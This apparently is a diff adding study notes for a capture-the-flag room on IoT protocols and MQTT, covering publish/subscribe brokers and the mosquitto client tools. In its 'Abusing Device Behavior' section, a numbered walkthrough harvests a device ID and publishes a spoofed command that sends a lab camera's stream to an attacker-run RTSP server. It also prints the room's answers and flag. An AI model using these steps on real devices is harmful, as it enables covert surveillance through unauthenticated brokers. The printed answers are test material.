@@ -1,0 +1,194 @@
+# Learning Objectives
+
+    1. Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
+    2. Understand the difference between an IoT-specific protocol and other network service protocols.
+    3. Understand what a publish/subscribe model is and how it interacts with IoT devices.
+    4. Analyze and exploit the behavior of a vulnerable IoT device.
+    
+							## What is the Internet of Things 
+							
+# The Internet of Things (IoT) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.
+
+# While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.” 
+							
+ # If IoT defines such an extensive categorization of devices with varying capabilities and objectives, what makes them important or warrants that we study them? While several justifiable reasons exist to study IoT, we will address three possible answers.
+ 
+1. First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices.
+--->IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. 
+--->Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. 
+--->While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.  
+
+2. Second, devices are interconnected and often involve no human interaction. 
+--> Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a --> secure means of communication such that human interaction is not required, e.g., using a password.
+
+3. Third, devices are designed to all be interconnected, so if device a is using x protocol and device b is using y protocol, it presents a significant problem in compatibility. The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.
+
+# Remember, security is often thought of as secondary, so not ensuring a device can securely communicate with other devices may be a fatal weakness that is overlooked or deemed less important.
+
+							
+								## Introduction to IoT Protocols
+								
+# An "IoT protocol" categorizes any protocol used by an IoT device for machine-to-machine, machine-to-gateway, or machine-to-cloud communication. 
+# As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be efficient, reliable, and secure data communication.
+
+# We can break up IoT protocols into one of two types, an IoT data protocol or an IoT network protocol.
+
+# We can break up IoT protocols into one of two types, an IoT data protocol or an IoT network protocol.
+# These types may be deceiving in their name as both are used to communicate data. 
+# How they differentiate is how and where the communication occurs. 
+# At a glance, an IoT data protocol commonly relies on the TCP/IP (Transmission Control Protocol/Internet Protocol) model, and an IoT network protocol relies on wireless technology for communication. 
+# We will continue expanding the purpose of these protocol types below.								
+								
+# Let's break down an IoT data protocol into concepts that may be more familiar to us. An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.
+
+# An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.
+
+# Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.
+
+								## Messaging Protocols and Middleware 
+# Because data communication is the primary objective of IoT data protocols, they commonly take the form of a messaging protocol; that is, the protocol facilities the sending and receiving of a message or payload between two parties.
+
+# Messaging protocols communicate between two devices through an independent server (”middleware”) or by negotiating a communication method amongst themselves.
+# Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.
+# Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.
+
+MQTT (Message Queuing Telemetry Transport) --> A lightweight protocol that relies on a publish/subscribe model to send or receive messages.
+CoAP (Constrained Application Protocol) ---> Translates HTTP communication to a usable communication medium for lightweight devices.
+AMQP (Advanced Message Queuing Protocol) ---> Acts as a transactional protocol to receive, queue, and store messages/payloads between devices.
+DDS (Data Distribution Service ---> A scalable protocol that relies on a publish/subscribe model to send or receive messages. 
+HTTP (Hypertext Transfer Protocol) --> Used as a communication method from traditional devices to lightweight devices or for large data communication.
+WebSocket  ---> Relies on a client-server model to send data over a TCP connection.
+
+							
+							## Functionality of a Publish/Subscribe Model
+# Messaging protocols commonly use a publish/subscribe model, notably the MQTT protocol. The model relies on a broker to negotiate "published" messages and "subscription" queries.
+
+
+    1. A publisher sends their message to a broker.
+    2. The broker continues relaying the message until a new message is published.
+    3. A subscriber can attempt to connect to a broker and receive a message.
+    
+# The protocol should work fantastically if a single broker is needed for one device's objective, but what if several types of data need to be sent from one device or several publishers and subscribers need to connect to one broker? Using more than one broker can be feasible but increases unnecessary overhead and server usage.
+
+# A secure communication method should also ensure the integrity of messages, meaning one publisher should not overwrite another.
+
+# To address these problems, a broker can store multiple messages from different publishers by using topics. 
+# A topic is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. 
+# The format of a topic commonly takes the form of <name>/<id>/<function>. 
+# When a new message is sent with a given topic, the broker will store or overwrite it under the topic and relay it to subscribers who have "subscribed" to it. 
+
+# Note the asynchronous nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.
+
+# Well, we should now understand the functionality of this model, but why would an IoT device use it?
+
+# A publish/subscribe model is helpful for any data maintained asynchronously or received by several different devices from one publisher.
+
+# A common example of a publish/subscribe model could be a thermostat publishing its current temperature. Several thermostats can publish to one broker, and several devices can subscribe to the thermostat they want data from.
+
+# As a protocol specifically, MQTT is also lightweight, with a small footprint and minimal bandwidth.
+
+							## Are IoT Protocols Inherently Vulnerable?
+							
+# Let's apply this to something we are more familiar with, HTTP. "HTTP vulnerabilities" often refer to a vulnerability in the software/application built off the protocol; this does not mean protocols are absent of vulnerabilities, but they generally possess strict requirements and require revisions before release or public adoption.
+
+# Similarly, IoT protocols are not inherently vulnerable, so what makes an IoT device insecure?-->  IoT devices are vulnerable because of their applications' behavior
+
+							
+							## Abusing Device Behavior
+							
+# Most IoT devices have a device ID that they use to identify themselves to other devices and that other devices can use to identify the target device. 
+# Devices must exchange this device ID before any other communication can occur. In the case of MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.
+
+# Once an attacker knows the device ID and behavior of a target device they can attempt to target specific topics or message formats. These topics may trust the message source and perform some action blindly (e.g. change a temperature, change a publishing destination, etc.)
+
+
+1. nmap -p 1883 -sV -sC 10.10.202.18
+2. mosquitto_sub -h 10.10.202.18 -t device/init VIN2S1153JE3VKK6HY91 // Check Device init
+3. sudo docker run --rm -it -e RTSP_PROTOCOLS=tcp -p 8554:8554 -p 1935:1935 -p 8888:8888 aler9/rtsp-simple-server
+4. {"cmd":"10","url":"rtsp://10.9.28.247:8554/diof"} //tuno address
+5. mosquitto_pub -h 10.10.202.18 -t device/VIN2S1153JE3VKK6HY91/cmd -m """{"cmd":"10","url":"rtsp://10.9.28.247:8554/diof"}""" //-h <Target address>
+6. vlc rtsp://127.0.0.1:8554/diof
+
+1.6.9
+
+THM{UR_CAMERA_IS_MINE}
+
+
+								## Interacting with MQTT
+								
+# How do we interact with MQTT or other IoT protocols? Different protocols will have different libraries or other means of interacting with them. 
+# For MQTT, there are two commonly used libraries we will discuss, that is, Paho and Mosquitto. 
+# Paho is a python library that offers support for all features of MQTT. 
+# Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.	
+
+<> Subscribing to a Topic
+
+# We can use the mosquitto_sub client utility to subscribe to an MQTT broker.
+# By default, the subscription utility will connect a localhost broker and only require a topic to be defined using the -t or —topic flag. Below is an example of connecting to a localhost and subscribing to the topic, device/ping.
+
+mosquitto_sub -t device/ping
+
+# You can also specify a remote broker using the -h flag. Below is an example of connecting to example.thm and subscribing to the topic, device/thm.
+
+mosquitto_sub -h example.thm -t device/thm
+
+<> Publishing to a Topic
+
+# We can use the mosquitto_pub client utility to publish to an MQTT broker.
+# To publish a message to a topic is nearly identical to that of the subscription client.
+#  This time, however, we need to include a -m or —message flag to denote our message/payload. 
+# Below is an example of publishing to the topic, device/info on the host, example.thm with the message, "This is an example."
+
+mosquitto_pub -h example.thm -t device/info -m "This is an example"
+
+# For both clients, there are several notable optional flags that we will briefly mention,
+
+    -d: Enables debug messages.
+    -i or —id: Specifies the id to identify the client to the server.
+    -p or —port: Specifies the port the broker is using. Defaults to port 1883.
+    -u or —username: Used to specify the username for authentication.
+    -P or —password: Used to specify the password for authentication.
+    —url: Used to specify username, password, host, port, and topic in one URL.							
+
+# A device using MQTT will craft messages as a means of communication authentically. 
+# As an attacker, we will attempt to portray our publishing source as a legitimate source in hopes that the other side will interact with the message as it would an authentic message to provide us with unintended behavior. 
+
+
+
+
+
+
+
+
+
+
+
+
+   
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+ 																							
+								
+								
+								
+								
+								
+								
+								
+								
+								
+								
+								
+								
